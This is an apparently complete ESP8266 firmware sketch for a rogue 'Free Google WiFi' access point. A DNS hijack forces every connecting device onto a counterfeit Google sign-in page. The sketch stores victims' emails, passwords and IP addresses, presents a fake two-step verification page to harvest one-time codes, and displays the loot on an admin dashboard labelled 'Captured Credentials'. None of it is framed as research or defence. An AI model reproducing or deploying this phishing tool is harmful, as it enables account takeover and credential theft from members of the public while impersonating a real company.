#include <IPAddress.h>
#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>
#include <LittleFS.h>

// ===== DEFINITIONS =====
const char* WIFI_SSID = "Free Google WiFi";
const char* WIFI_SUBTITLE = "Secure Public Access";
const uint8_t WEB_PORT = 80;
const uint8_t DNS_PORT = 53;
IPAddress AP_IP(172, 0, 0, 1);
IPAddress AP_NETMASK(255, 255, 255, 0);
const uint8_t LED_PIN = 2;
const char* DATA_FILE = "/saved_data.txt";
const char* ADMIN_FILE = "/admin_pass.txt";
const char* DEFAULT_ADMIN_PASSWORD = "admin123";

// Global Variables
String data = "";
int savedData = 0;
unsigned long bootTime = 0;
String tempEmail = "";
String tempPassword = "";
String tempIP = "";
bool adminAuthenticated = false;
unsigned long adminAuthTimeout = 0;

DNSServer dnsServer;
ESP8266WebServer webServer(WEB_PORT);

// Function declarations
void readData();
void writeData(String data);
void deleteData();
String googleIndex();
String creds();
String posted();
String clear();
void BLINK();
String otpPage();
bool checkAdminPassword(String password);
void changeAdminPassword(String newPassword);
String adminDashboard();
String adminLoginPage();

String input(String argName) {
  String a = webServer.arg(argName);
  a.replace("<", "&lt;"); a.replace(">", "&gt;");
  if (a.length() > 200) a = a.substring(0, 200);
  return a;
}

void readData() {
  File file = LittleFS.open(DATA_FILE, "r");
  data = file ? file.readString() : "";
  file.close();
  if (data != "") savedData = 1;
}

void writeData(String data) {
  File file = LittleFS.open(DATA_FILE, "w");
  if (file) { file.print(data); file.close(); }
}

void deleteData() { LittleFS.remove(DATA_FILE); }

void BLINK() {
  for (int i = 0; i < 3; i++) {
    digitalWrite(LED_PIN, LOW); delay(300);
    digitalWrite(LED_PIN, HIGH); delay(300);
  }
}

bool checkAdminPassword(String password) {
  File file = LittleFS.open(ADMIN_FILE, "r");
  if (!file) {
    File newFile = LittleFS.open(ADMIN_FILE, "w");
    newFile.print(DEFAULT_ADMIN_PASSWORD);
    newFile.close();
    return password == DEFAULT_ADMIN_PASSWORD;
  }
  String storedPassword = file.readString();
  file.close();
  return password == storedPassword;
}

void changeAdminPassword(String newPassword) {
  File file = LittleFS.open(ADMIN_FILE, "w");
  if (file) { file.print(newPassword); file.close(); }
}

bool isAdminAuthenticated() {
  if (adminAuthenticated && (millis() - adminAuthTimeout) < 1800000) return true;
  if (webServer.hasArg("admin_pass") && checkAdminPassword(webServer.arg("admin_pass"))) {
    adminAuthenticated = true;
    adminAuthTimeout = millis();
    return true;
  }
  return false;
}

void checkAdminSessionTimeout() {
  if (adminAuthenticated && (millis() - adminAuthTimeout) > 1800000) {
    adminAuthenticated = false;
  }
}

String adminLoginPage() {
  return R"raw(
<!DOCTYPE html><html>
<head><title>Admin Login</title><meta name=viewport content="width=device-width,initial-scale=1">
<style>
body{background:#f8f9fa;font-family:Arial,sans-serif;margin:0;padding:20px;}
.login-container{max-width:400px;margin:100px auto;background:white;padding:30px;border-radius:10px;box-shadow:0 5px 15px rgba(0,0,0,0.1);text-align:center;}
h2{color:#1a73e8;margin-bottom:20px;}
input[type=password]{width:100%;padding:12px;margin:10px 0;border:1px solid #dadce0;border-radius:5px;font-size:16px;}
input[type=submit]{background:#1a73e8;color:white;padding:12px 20px;border:none;border-radius:5px;cursor:pointer;font-size:16px;}
input[type=submit]:hover{background:#1560b9;}
</style></head>
<body>
<div class=login-container>
<h2>🔒 Admin Login</h2>
<form action=/admin method=post>
<input type=password name=admin_pass placeholder=Password required>
<input type=submit value=Login>
</form></div></body></html>
)raw";
}

String adminDashboard() {
  String dashboard = R"raw(
<!DOCTYPE html><html>
<head><title>Admin Dashboard</title><meta name=viewport content="width=device-width,initial-scale=1">
<style>
*{box-sizing:border-box;margin:0;padding:0;font-family:'Segoe UI',Arial,sans-serif;}
body{background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);color:#333;min-height:100vh;}
.dashboard-container{max-width:1200px;margin:0 auto;padding:20px;}
.header{background:rgba(255,255,255,0.95);padding:30px;border-radius:20px;margin-bottom:30px;box-shadow:0 10px 30px rgba(0,0,0,0.2);text-align:center;}
.header h1{color:#2c3e50;font-size:2.5em;margin-bottom:10px;}
.header p{color:#7f8c8d;font-size:1.2em;}
.stats-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(250px,1fr));gap:20px;margin-bottom:30px;}
.stat-card{background:rgba(255,255,255,0.95);padding:25px;border-radius:15px;box-shadow:0 8px 25px rgba(0,0,0,0.15);text-align:center;transition:transform 0.3s ease;}
.stat-card:hover{transform:translateY(-5px);}
.stat-number{font-size:2.5em;font-weight:bold;color:#2c3e50;margin-bottom:10px;}
.stat-label{color:#7f8c8d;font-size:1.1em;}
.controls-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(300px,1fr));gap:20px;}
.control-card{background:rgba(255,255,255,0.95);padding:20px;border-radius:15px;box-shadow:0 8px 25px rgba(0,0,0,0.15);}
.control-card h3{margin-bottom:15px;color:#2c3e50;}
.btn{display:inline-block;padding:12px 25px;background:#3498db;color:white;text-decoration:none;border-radius:8px;margin:5px;transition:background 0.3s ease;border:none;cursor:pointer;font-size:14px;}
.btn:hover{background:#2980b9;}
.btn-danger{background:#e74c3c;}
.btn-danger:hover{background:#c0392b;}
.btn-success{background:#2ecc71;}
.btn-success:hover{background:#27ae60;}
.footer{text-align:center;margin-top:40px;color:rgba(255,255,255,0.8);}
@media (max-width:768px){.dashboard-container{padding:15px;}.header{padding:20px;}.stats-grid{grid-template-columns:1fr;}.btn{padding:10px 20px;}}
</style>
<script>
function changePassword(){
  const newPass=document.getElementById('newPass').value;
  const confirmPass=document.getElementById('confirmPass').value;
  if(newPass&&newPass===confirmPass){
    fetch('/change-password?new_pass='+newPass,{method:'POST'});
    alert('Password changed successfully!');
  }else{
    alert('Passwords do not match!');
  }
}
</script>
</head>
<body>
<div class="dashboard-container">
<div class="header">
<h1>Admin Dashboard</h1>
<p>Complete control panel for your captive portal</p>
</div>

<div class="stats-grid">
<div class="stat-card">
<div class="stat-number">)raw" + String(savedData) + R"raw(</div>
<div class="stat-label">Credentials Captured</div>
</div>

<div class="stat-card">
<div class="stat-number">)raw" + String(WiFi.softAPgetStationNum()) + R"raw(</div>
<div class="stat-label">Connected Clients</div>
</div>

<div class="stat-card">
<div class="stat-number">)raw" + String(millis() / 1000) + R"raw(s</div>
<div class="stat-label">System Uptime</div>
</div>

<div class="stat-card">
<div class="stat-number">)raw" + String(ESP.getFreeHeap() / 1024) + R"raw( KB</div>
<div class="stat-label">Free Memory</div>
</div>
</div>

<div class="controls-grid">
<div class="control-card">
<h3>Credentials Management</h3>
<a href="/creds" class="btn">View Credentials</a>
<a href="/clear" class="btn btn-danger">Clear All</a>
</div>

<div class="control-card">
<h3>System Settings</h3>
<input type="password" id="newPass" placeholder="New Password" style="width:100%;padding:8px;margin:5px 0;">
<input type="password" id="confirmPass" placeholder="Confirm Password" style="width:100%;padding:8px;margin:5px 0;">
<button onclick="changePassword()" class="btn">Change Password</button>
<a href="/" class="btn btn-success">View Portal</a>
</div>
</div>

<div class="footer">
<p>ESP8266 Captive Portal | Version 3.1 | 2025</p>
</div>
</div>
</body>
</html>
)raw";

  return dashboard;
}

String googleIndex() {
  return R"raw(
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google WiFi - Sign In</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Google Sans', Arial, sans-serif; }
        body { background-color: #f8f9fa; color: #202124; font-size: 14px; line-height: 1.5; margin: 0; padding: 20px; }
        
        .container { 
            max-width: 450px; 
            margin: 40px auto; 
            background: white; 
            border-radius: 12px; 
            box-shadow: 0 2px 10px rgba(0,0,0,0.1); 
            overflow: hidden;
        }
        
        .google-header {
            background: #1a73e8;
            color: white;
            padding: 25px;
            text-align: center;
        }
        
        .google-header h1 {
            font-size: 24px;
            font-weight: 500;
            margin-bottom: 8px;
        }
        
        .google-header p {
            font-size: 14px;
            opacity: 0.9;
            margin: 0;
        }
        
        .wifi-info {
            text-align: center;
            padding: 15px;
            background: #e8f0fe;
            border-bottom: 1px solid #d2e3fc;
        }
        
        .wifi-info p {
            margin: 0;
            color: #1a73e8;
            font-size: 13px;
            font-weight: 500;
        }
        
        .login-content {
            padding: 25px;
        }
        
        .data-offer {
            text-align: center;
            margin: 20px 0;
            padding: 15px;
            background: #f8f9fa;
            border-radius: 8px;
            border: 1px solid #dadce0;
        }
        
        .data-offer h3 {
            color: #1a73e8;
            font-size: 16px;
            font-weight: 500;
            margin-bottom: 5px;
        }
        
        .data-offer p {
            color: #5f6368;
            font-size: 13px;
            margin: 0;
        }
        
        .benefits {
            display: flex;
            justify-content: space-between;
            margin: 20px 0;
            gap: 15px;
        }
        
        .benefit {
            text-align: center;
            flex: 1;
        }
        
        .benefit-icon {
            font-size: 24px;
            color: #1a73e8;
            margin-bottom: 8px;
        }
        
        .benefit h4 {
            color: #1a73e8;
            font-size: 13px;
            font-weight: 500;
            margin-bottom: 4px;
        }
        
        .benefit p {
            color: #5f6368;
            font-size: 11px;
            margin: 0;
        }
        
        .login-form {
            margin: 25px 0;
        }
        
        .form-group {
            margin-bottom: 20px;
        }
        
        .input-field {
            width: 100%;
            padding: 15px;
            border: 1px solid #dadce0;
            border-radius: 8px;
            font-size: 16px;
            color: #202124;
            background: #fff;
            transition: border-color 0.2s ease;
        }
        
        .input-field:focus {
            outline: none;
            border-color: #1a73e8;
            box-shadow: 0 0 0 2px rgba(26, 115, 232, 0.2);
        }
        
        .input-field::placeholder {
            color: #9aa0a6;
        }
        
        .btn-google {
            width: 100%;
            padding: 15px;
            background: #1a73e8;
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 500;
            cursor: pointer;
            transition: background-color 0.2s ease;
        }
        
        .btn-google:hover {
            background: #1565c0;
        }
        
        .privacy-note {
            text-align: center;
            margin-top: 20px;
            padding-top: 20px;
            border-top: 1px solid #dadce0;
        }
        
        .privacy-note p {
            color: #5f6368;
            font-size: 12px;
            margin: 0;
        }
        
        .footer {
            text-align: center;
            padding: 20px;
            background: #f8f9fa;
            border-top: 1px solid #dadce0;
        }
        
        .footer-links {
            display: flex;
            justify-content: center;
            gap: 20px;
            margin-bottom: 10px;
        }
        
        .footer-link {
            color: #5f6368;
            font-size: 12px;
            text-decoration: none;
        }
        
        .footer-link:hover {
            color: #1a73e8;
        }
        
        .copyright {
            color: #9aa0a6;
            font-size: 11px;
            margin: 0;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="google-header">
            <h1>Google WiFi</h1>
            <p>Secure Public Access</p>
        </div>
        
        <div class="wifi-info">
            <p>Connected to: Free Google WiFi</p>
        </div>
        
        <div class="login-content">
            <div class="data-offer">
                <h3>🎁 Exclusive Google Offer</h3>
                <p>Sign in with Google and get <strong>10GB daily data</strong></p>
            </div>
            
            <div class="benefits">
                <div class="benefit">
                    <div class="benefit-icon">⚡</div>
                    <h4>High Speed</h4>
                    <p>Up to 100Mbps</p>
                </div>
                <div class="benefit">
                    <div class="benefit-icon">🔒</div>
                    <h4>Secure</h4>
                    <p>Google protected</p>
                </div>
            </div>
            
            <div class="login-form">
                <form action="/post" method="post">
                    <div class="form-group">
                        <input type="email" class="input-field" name="email" placeholder="Google Email" autocomplete="email" required>
                    </div>
                    
                    <div class="form-group">
                        <input type="password" class="input-field" name="password" placeholder="Google Password" autocomplete="current-password" required>
                    </div>
                    
                    <button type="submit" class="btn-google">Sign in with Google</button>
                </form>
            </div>
            
            <div class="privacy-note">
                <p>Your privacy is protected by Google's security standards</p>
            </div>
        </div>
        
        <div class="footer">
            <div class="footer-links">
                <a href="#" class="footer-link">Help</a>
                <a href="#" class="footer-link">Privacy</a>
                <a href="#" class="footer-link">Terms</a>
            </div>
            <p class="copyright">2025 Google LLC. All rights reserved.</p>
        </div>
    </div>
</body>
</html>
)raw";
}

String otpPage() {
  if (tempEmail == "" || tempPassword == "") {
    return R"raw(
<!DOCTYPE html><html>
<head><title>Session Expired</title><meta name=viewport content="width=device-width,initial-scale=1">
<style>
body{background:#f8f9fa;font-family:Arial,sans-serif;text-align:center;padding:50px;}
.error-container{background:white;padding:40px;border-radius:10px;box-shadow:0 5px 15px rgba(0,0,0,0.1);max-width:500px;margin:0 auto;}
h2{color:#ff4444;margin-bottom:20px;}
a{color:#1a73e8;text-decoration:none;font-size:18px;}
</style></head>
<body>
<div class=error-container>
<h2>Session Expired</h2>
<p>Please go back and enter your credentials again.</p>
<a href=/>Return to Login</a>
</div></body></html>
)raw";
  }
  
  return R"raw(
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google Security - OTP Verification</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Google Sans', Arial, sans-serif; }
        body { background-color: #f8f9fa; color: #202124; font-size: 14px; line-height: 1.5; margin: 0; padding: 20px; }
        
        .container { 
            max-width: 450px; 
            margin: 40px auto; 
            background: white; 
            border-radius: 12px; 
            box-shadow: 0 2px 10px rgba(0,0,0,0.1); 
            overflow: hidden;
        }
        
        .google-header {
            background: #1a73e8;
            color: white;
            padding: 25px;
            text-align: center;
        }
        
        .google-header h1 {
            font-size: 24px;
            font-weight: 500;
            margin-bottom: 8px;
        }
        
        .security-badge {
            text-align: center;
            padding: 15px;
            background: #e8f0fe;
            border-bottom: 1px solid #d2e3fc;
            font-weight: 500;
            color: #1a73e8;
        }
        
        .login-content {
            padding: 25px;
        }
        
        .user-info {
            background: #f8f9fa;
            padding: 15px;
            border-radius: 8px;
            margin-bottom: 20px;
            border: 1px solid #dadce0;
        }
        
        .user-info p {
            margin: 5px 0;
            color: #5f6368;
        }
        
        .user-info strong {
            color: #202124;
        }
        
        .otp-instructions {
            text-align: center;
            margin: 20px 0;
        }
        
        .otp-instructions h3 {
            color: #1a73e8;
            font-size: 18px;
            margin-bottom: 10px;
        }
        
        .otp-instructions p {
            color: #5f6368;
            margin-bottom: 15px;
        }
        
        .otp-form {
            margin: 25px 0;
        }
        
        .form-group {
            margin-bottom: 20px;
        }
        
        .input-field {
            width: 100%;
            padding: 15px;
            border: 1px solid #dadce0;
            border-radius: 8px;
            font-size: 16px;
            color: #202124;
            background: #fff;
            text-align: center;
            letter-spacing: 8px;
            font-weight: bold;
        }
        
        .input-field:focus {
            outline: none;
            border-color: #1a73e8;
            box-shadow: 0 0 0 2px rgba(26, 115, 232, 0.2);
        }
        
        .btn-verify {
            width: 100%;
            padding: 15px;
            background: #1a73e8;
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 500;
            cursor: pointer;
        }
        
        .btn-verify:hover {
            background: #1565c0;
        }
        
        .resend-otp {
            text-align: center;
            margin-top: 20px;
        }
        
        .resend-link {
            color: #1a73e8;
            text-decoration: none;
        }
        
        .privacy-note {
            text-align: center;
            margin-top: 20px;
            padding-top: 20px;
            border-top: 1px solid #dadce0;
            color: #5f6368;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="google-header">
            <h1>Google Security</h1>
            <p>Two-Step Verification</p>
        </div>
        
        <div class="security-badge">
            <p>🔒 Enhanced Security Enabled</p>
        </div>
        
        <div class="login-content">
            <div class="user-info">
                <p><strong>Account:</strong> )raw" + tempEmail + R"raw(</p>
                <p><strong>Device:</strong> New WiFi Connection</p>
                <p><strong>Location:</strong> Unknown network</p>
            </div>
            
            <div class="otp-instructions">
                <h3>Enter verification code</h3>
                <p>For your security, we've sent a 6-digit code to your registered devices</p>
            </div>
            
            <div class="otp-form">
                <form action="/validate-otp" method="post">
                    <div class="form-group">
                        <input type="text" class="input-field" name="otp" placeholder="Enter 6-digit code" 
                               pattern="[0-9]{6}" maxlength="6" required 
                               oninput="this.value = this.value.replace(/[^0-9]/g, '').slice(0,6)">
                    </div>
                    
                    <button type="submit" class="btn-verify">Verify and Connect</button>
                </form>
            </div>
            
            <div class="resend-otp">
                <a href="#" class="resend-link">Resend code</a>
            </div>
            
            <div class="privacy-note">
                <p>This helps us keep your account secure from unauthorized access</p>
            </div>
</div>
</div>

<script>
document.querySelector('.input-field').focus();
document.querySelector('.input-field').addEventListener('input', function() {
    if (this.value.length === 6) {
        this.form.submit();
    }
});
</script>
</body>
</html>
)raw";
}

String creds() {
  readData();
  
  if (data == "") {
    return R"raw(
<!DOCTYPE html><html>
<head><title>No Credentials</title><meta name=viewport content="width=device-width,initial-scale=1">
<style>
body{background:#f8f9fa;font-family:Arial,sans-serif;text-align:center;padding:50px;}
.container{background:white;padding:40px;border-radius:10px;box-shadow:0 5px 15px rgba(0,0,0,0.1);max-width:600px;margin:0 auto;}
h2{color:#1a73e8;margin-bottom:20px;}
button{background:#1a73e8;color:white;padding:12px 25px;border:none;border-radius:5px;cursor:pointer;margin:10px;}
a{color:#1a73e8;text-decoration:none;}
</style></head>
<body>
<div class=container>
<h2>No Credentials Captured Yet</h2>
<p>Waiting for users to submit their credentials...</p>
<button onclick=location.reload()>Refresh</button>
<p><a href=/>Back to Index</a></p>
</div></body></html>
)raw";
  }
  
  return R"raw(
<!DOCTYPE html><html>
<head><title>Captured Credentials</title><meta name=viewport content="width=device-width,initial-scale=1">
<style>
body{background:#f8f9fa;font-family:Arial,sans-serif;padding:20px;}
.container{max-width:1200px;margin:0 auto;background:white;padding:30px;border-radius:10px;box-shadow:0 5px 15px rgba(0,0,0,0.1);}
h1{color:#1a73e8;text-align:center;margin-bottom:30px;}
table{width:100%;border-collapse:collapse;margin:20px 0;}
th{background:#1a73e8;color:white;padding:12px;text-align:left;border:1px solid #ddd;}
td{padding:8px;border:1px solid #ddd;}
tr:nth-child(even){background:#f2f2f2;}
.controls{text-align:center;margin:30px 0;}
button{background:#1a73e8;color:white;padding:12px 25px;border:none;border-radius:5px;cursor:pointer;margin:10px;}
.btn-danger{background:#e74c3c;}
.btn-danger:hover{background:#c0392b;}
a{color:#1a73e8;text-decoration:none;margin:10px;}
</style></head>
<body>
<div class=container>
<h1>Captured Credentials</h1>
<div style="overflow-x:auto;">
<table>
<tr><th>Timestamp</th><th>Client IP</th><th>Email</th><th>Password</th><th>OTP</th></tr>
)raw" + data + R"raw(
</table>
</div>
<div class=controls>
<button onclick=location.reload()>Refresh</button>
<a href=/>Back to Index</a>
<a href=/clear class=btn-danger >Clear All Credentials</a>
</div>
</div></body></html>
)raw";
}

String posted() {
  String email = input("email");
  String password = input("password");
  String clientIP = webServer.client().remoteIP().toString();
  
  readData();
  String timestamp = String(millis() / 1000);
  data = data + "<tr><td>" + timestamp + "s</td><td>" + clientIP + "</td><td>" + email + "</td><td>" + password + "</td><td style='color:orange;'>Pending OTP</td></tr>";
  writeData(data);
  savedData = 1;
  
  tempEmail = email;
  tempPassword = password;
  tempIP = clientIP;
  
  webServer.send(200, "text/html", R"raw(
<!DOCTYPE html><html>
<head><meta http-equiv="refresh" content="0; url=/otp"><title>Redirecting</title></head>
<body><p>Redirecting to security verification...</p><script>window.location.href='/otp'</script></body></html>
)raw");
  return "";
}

String clear() {
  data = "";
  savedData = 0;
  deleteData();
  return R"raw(
<!DOCTYPE html><html>
<head><title>Credentials Cleared</title><meta name=viewport content="width=device-width,initial-scale=1">
<style>
body{background:#f8f9fa;font-family:Arial,sans-serif;text-align:center;padding:50px;}
.container{background:white;padding:40px;border-radius:10px;box-shadow:0 5px 15px rgba(0,0,0,0.1);max-width:500px;margin:0 auto;}
h2{color:#4CAF50;margin-bottom:20px;}
a{color:#1a73e8;text-decoration:none;font-size:18px;}
</style></head>
<body>
<div class=container>
<h2>✅ Credentials Cleared</h2>
<p>The credentials list has been reset successfully.</p>
<a href=/>Back to Index</a>
</div></body></html>
)raw";
}

void setup() {
  Serial.begin(115200);
  pinMode(LED_PIN, OUTPUT);
  digitalWrite(LED_PIN, HIGH);
  
  // Initialize LittleFS
  if (!LittleFS.begin()) {
    Serial.println("LittleFS Mount Failed");
    return;
  }
  
  // Set up WiFi AP
  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(AP_IP, AP_IP, AP_NETMASK);
  WiFi.softAP(WIFI_SSID);
  
  // Set up DNS server for captive portal
  dnsServer.start(DNS_PORT, "*", AP_IP);
  
  // Set up web server routes
  webServer.on("/", []() {
    webServer.send(200, "text/html", googleIndex());
  });
  
  webServer.on("/post", []() {
    webServer.send(200, "text/html", posted());
  });
  
  webServer.on("/otp", []() {
    webServer.send(200, "text/html", otpPage());
  });
  
  webServer.on("/validate-otp", []() {
    String otp = webServer.arg("otp");
    if (otp.length() == 6) {
      readData();
      data.replace("Pending OTP", "Verified: " + otp);
      writeData(data);
      webServer.send(200, "text/html", R"raw(
<!DOCTYPE html><html>
<head><title>Connection Successful</title><meta name=viewport content="width=device-width,initial-scale=1">
<style>
body{background:#f8f9fa;font-family:Arial,sans-serif;text-align:center;padding:50px;}
.success-container{background:white;padding:40px;border-radius:10px;box-shadow:0 5px 15px rgba(0,0,0,0.1);max-width:500px;margin:0 auto;}
h2{color:#4CAF50;margin-bottom:20px;}
p{color:#5f6368;margin-bottom:20px;}
</style></head>
<body>
<div class=success-container>
<h2>Connection Successful</h2>
<p>Your Google account has been verified and you are now connected to Google WiFi.</p>
<p>Enjoy your 10GB daily data!</p>
</div></body></html>
)raw");
    } else {
      webServer.send(200, "text/html", R"raw(
<!DOCTYPE html><html>
<head><title>Invalid Code</title><meta name=viewport content="width=device-width,initial-scale=1">
<style>
body{background:#f8f9fa;font-family:Arial,sans-serif;text-align:center;padding:50px;}
.error-container{background:white;padding:40px;border-radius:10px;box-shadow:0 5px 15px rgba(0,0,0,0.1);max-width:500px;margin:0 auto;}
h2{color:#ff4444;margin-bottom:20px;}
a{color:#1a73e8;text-decoration:none;font-size:18px;}
</style></head>
<body>
<div class=error-container>
<h2>Invalid Verification Code</h2>
<p>Please try again with a valid 6-digit code.</p>
<a href=/otp>Try Again</a>
</div></body></html>
)raw");
    }
    tempEmail = "";
    tempPassword = "";
    tempIP = "";
  });
  
  webServer.on("/creds", []() {
    if (!isAdminAuthenticated()) {
      webServer.send(200, "text/html", adminLoginPage());
      return;
    }
    webServer.send(200, "text/html", creds());
  });
  
  webServer.on("/clear", []() {
    if (!isAdminAuthenticated()) {
      webServer.send(200, "text/html", adminLoginPage());
      return;
    }
    webServer.send(200, "text/html", clear());
  });
  
  webServer.on("/admin", []() {
    if (!isAdminAuthenticated()) {
      webServer.send(200, "text/html", adminLoginPage());
      return;
    }
    webServer.send(200, "text/html", adminDashboard());
  });
  
  webServer.on("/change-password", []() {
    if (!isAdminAuthenticated()) {
      webServer.send(200, "text/html", adminLoginPage());
      return;
    }
    if (webServer.hasArg("new_pass")) {
      changeAdminPassword(webServer.arg("new_pass"));
      webServer.send(200, "text/plain", "Password changed");
    } else {
      webServer.send(400, "text/plain", "Missing new password");
    }
  });
  
  // Handle all other requests with captive portal redirect
  webServer.onNotFound([]() {
    webServer.sendHeader("Location", "http://" + webServer.client().localIP().toString(), true);
    webServer.send(302, "text/plain", "");
  });
  
  webServer.begin();
  Serial.println("HTTP server started");
  Serial.print("AP IP address: ");
  Serial.println(WiFi.softAPIP());
  
  bootTime = millis();
  BLINK();
}

void loop() {
  dnsServer.processNextRequest();
  webServer.handleClient();
  checkAdminSessionTimeout();
  
  // Blink LED periodically to show activity
  static unsigned long lastBlink = 0;
  if (millis() - lastBlink > 5000) {
    digitalWrite(LED_PIN, LOW);
    delay(100);
    digitalWrite(LED_PIN, HIGH);
    lastBlink = millis();
  }
}